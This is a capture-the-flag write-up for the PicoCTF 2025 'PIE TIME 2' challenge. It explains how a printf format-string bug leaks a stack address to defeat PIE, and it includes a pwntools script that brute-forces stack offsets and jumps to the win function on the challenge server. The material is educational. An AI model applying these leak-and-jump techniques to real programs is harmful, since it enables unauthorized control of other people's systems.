# PIE TIME 2
This was a challenge listed in PicoCTF 2025.  It's listed as medium and categorized as a Binary Exploitation challenge.

## Description
The Description reads:
> Can you try to get the flag?  
> I'm not revealing anything anymore!!> 

After starting the instance, you are provided with the source code and a binary executable.

## Hints
There is a single hint that reads:
> What vulnerability can be exploited to leak the address?
> Please be mindful of the size of pointers in this binary
# Solving
## My Thoughts
This was essentially an escalation from the previous PIE TIME challenge that required the use of different techniques to accomplish more or less the same goal.
It was definitely significantly more difficult, but was very enjoyable once I managed to grab the flag!

## Source Code
Let's start by looking through the source code, I've added in some comments to make it a little more readable:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

// Called when a segfault occurs in the code.  This'll happen when we enter in an incorrect address.
void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

// This function is the main runner for the program.
void call_functions() {
  // Initiates a string of length 64.
  char buffer[64];
  // Has the user insert their name and inserts it into the buffer created above.  Then prints out the name.
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  // Initiates a variable to hold the memory address requested below
  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  // Initiates a pointer to the user's provided memory address, then calls that pointer.
  void (*foo)(void) = (void (*)())val;
  foo();
}

// This is the function we're trying to get to, if we can call it we can get the flag printed out.
int win() {
  // Initiates a file object and a string object.
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Opens the flag file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  // Some complicated C thing, I don't think it was relevant to the actual challenge, can you tell I'm not a fan of C?
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
} 
```

So where exactly does our vulnerability sit?  Well the only thing that's really suspect here is this function:

``` c
  char buffer[64];
  // Has the user insert their name and inserts it into the buffer created above.  Then prints out the name.
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
```

printf is inherently insecure because it allows strings to be interpreted as format strings, allowing you to do all sorts of nasty little things with the program.
In our case, the %p format string in particular is what will help us bypass PIE.  %p will print the next memory address on the stack, with enough prodding we can get it to print the memory address of the win function!

## GDB

Let's see what that'll look like, until we have an exploit we're going to work with the binary executable:

![Format String](https://github.com/user-attachments/assets/0826651a-0e1c-45ae-8ee9-620f570c467b)

Interesting! But how do we figure out what memory address is the one we need?  That's where gdb comes in, the vmmap command spits out some memory information about the program:

![Memory Start](https://github.com/user-attachments/assets/4b7ab659-88b0-4814-841a-bc86b7abd8a5)

The topmost memory location is usually going to be the start address of the program, meaning that it SHOULD start at 0x555555554000.  How does that help us?

## Memory Leak
The string format issue allows us to print out memory addresses from the stack, if we can print out a memory address for a known location in the program, we can subtract the start memory location from the known location and get the memory offset!
With that offset, we can very easily figure out the memory location of the win function!  So let's get the standard location of win so we can figure out it's offset from the start as well, I'll also print the location of the other functions:

``` bash
pwndbg> print(win)
$3 = {<text variable, no debug info>} 0x55555555536a <win>
pwndbg> print(main)
$4 = {<text variable, no debug info>} 0x555555555400 <main>
pwndbg> print(call_functions)
$5 = {<text variable, no debug info>} 0x5555555552c7 <call_functions>
```

Ok cool, so the win function's offset from the start would be 0x55555555536a - 0x555555554000 = 0x136a

Let's see if we can find one of the above known memory addresses with the leak next.

## Finding a Known Address with the Leak

![Segfault](https://github.com/user-attachments/assets/539b0873-5aa4-457b-acac-895c72fb5d81)

Oh...that's not great.  So now we're not even getting to the second question after inputting all of those string formats, that's because of the buffer size that was set when the user input string was initialized
We can't send in more than 64 bytes of data, and each of those memory addresses doesn't seem to work! So what now?

More string formatting!  By formatting our input string like the following, we can access specific locations on the stack:  '%20$p'.

So let's give a few a try:

![Memory Addresses](https://github.com/user-attachments/assets/66f2885b-1b5c-4ac9-8c59-75c5dcd1dcc7)

That 0x555555555400 address looks familiar!  Awesome, so now let's figure out Main's offset from the start of the program (yes GDB makes it very easy to find this info, but when we connect to the server the memory addresses will be different thanks to PIE).

So 0x555555555400 - 0x555555554000 = 0x1400.  Amazing!  This offset will be the same no matter where the program is run.  So let's run the program and try out our payload without gdb:

![No GDB](https://github.com/user-attachments/assets/d8a68d5c-195a-4d71-8e0b-dba30bc8440d)

Start of Main:  0x561764140400
Offset: 0x1400
Start of Program:  0x561764140400 - 0x1400 = 0x56176413F000 (Ends in 000, this checks out)
Location of Win:  0x56176413F000 + 0x136a = 0x56176414036A

Let's give it a shot:

![You sorta Win](https://github.com/user-attachments/assets/60df1b56-e1aa-4080-927b-7c94d0e04183)

Yay! Looks like we've got it, time to try our solution out on the web server.

## Web Server
![Uh Oh](https://github.com/user-attachments/assets/24207c0f-a088-4ecd-844b-5f9851eb0b3f)

Uh oh.  That looks off, let's try the math:

Location of Main:  0x7fff2cfc7348
Offset:  0x1400
Start of Program:  0x7fff2cfc7348 - 0x1400 = 0x7fff2cfc5f48 (does not end in 000, probably wrong)

Ok, well that's annoying.  It seems like the stack may be different on the remote server for whatever reason.  This will be very annoying to figure out without some automation, so let's automate!

## Automation
The below script is what I eventually came up with to solve the problem:

``` python
#! /usr/bin/python3
from pwn import *
import itertools


port = int(input("Please enter the port: "))

# Loops through the values 1-40, trying out those stack locations.
for i in range(1,40):
 try:
  print("Currently on %s" % i)

  # Sets up the vuln binary exe as the test binary.
  # We can manipulate that to find win's location without having to do math.
  elf = context.binary = ELF('./vuln')
  # Connects to the remote server with the user provided port.
  p = remote("rescued-float.picoctf.net", port)

  # Reads through the connection text until it reaches the string 'name:'
  p.recvuntil(b'name:')

  # Sends the line that we'll be using to get the leak, .encode is necessary to quiet an annoying
  # pwntools warning.
  p.sendline(f'%{i}$p'.encode())
  # Grabs the leak from the web server.
  elf_leak = int(p.recvline(), 16)
  # Sets the start of the local binary executable's memory to what will hopefully be the web server's start.
  elf.address = elf_leak - 0x1400

  # Receives text from the web server until it matches '12345: '
  p.recvuntil(b'12345: ')

  # Gets the memory address of the win offset from the binary executable, then sends it in.
  mem = hex(elf.sym['win']).encode()
  print("Memory Location: %s" % mem)
  p.sendline(mem)

  # Gets the response, checks if the string 'won' is in it.
  res = p.clean().decode()
  if "won" in res:
   # If it is, we've gotten the flag and it prints it out before exiting the for loop.
   print("Flag Retrieved: %s" % res)
   p.close()
   break
  else:
   # Otherwise the connection is closed and the for loop iterates.
   p.close()
 # Sometimes the web server would spit out memory address vaues such as NULL which doesn't encode to binary.
 # This except is just an easier way of accounting for that problem.
 except:
  p.close()
  pass
```

Essentially this script will loop through stack values 1 to 40 in hopes of finding the memory address of main on the remote server.  Once it does, it'll print out the flag!

![Flag](https://github.com/user-attachments/assets/53aab61e-faa0-4f92-ae15-54db767f756c)

And there it is! Awesome!
